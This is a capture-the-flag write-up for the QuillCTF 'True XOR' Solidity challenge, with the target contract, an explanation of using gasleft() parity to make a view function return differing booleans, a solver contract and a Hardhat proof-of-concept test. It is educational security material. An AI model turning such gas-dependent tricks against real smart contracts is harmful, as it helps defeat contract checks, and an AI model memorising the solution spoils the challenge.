# QuillCTF : True XOR

## Objective of CTF
- Make a successful call to the `callMe` function.
- The given `target` parameter should belong to a contract deployed by you and should use `IBoolGiver` interface.

### Contract code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBoolGiver {
  function giveBool() external view returns (bool);
}

contract TrueXOR {
  function callMe(address target) external view returns (bool) {
    bool p = IBoolGiver(target).giveBool();
    bool q = IBoolGiver(target).giveBool();
    require((p && q) != (p || q), "bad bools");
    require(msg.sender == tx.origin, "bad sender");
    return true;
  }
}
```

We have to write a contract that will return a different boolean value on giveBool() function

Because according to the interface, giveBool() is a view function, we can't change the state on the first call to giveBool(), so we have to find something that will return differently on the first and second call to giveBool()

As the remaining gas on the second function call will be less than the remaining gas on the first function call, we can use `gasleft()`

### Attacker contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./true-xor.sol";

contract TrueXORSolver {
    function giveBool() external view returns (bool) {
        if (gasleft() % 2 == 0) {
            return true;
        }
        else {
            return false;
        }
    }
}
```

Finally find a value for gasLimit to call `callMe()` with the attacker contract address, that the first call and second call to `giveBool()` can return differently 

## Proof of concept

### Hardhat test
```js
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe('QuillCTF : True XOR', () => {

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('TrueXOR', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('Call to callMe() should be success', async () => {
    // deploy the attacker contract
    attackerContract = await ethers
      .getContractFactory('TrueXORSolver', attacker)
      .then(f => f.deploy());
    await attackerContract.deployed();

    expect(await contract.connect(attacker).callMe(attackerContract.address, {gasLimit: 100000})).to.be.true;
  });
});
```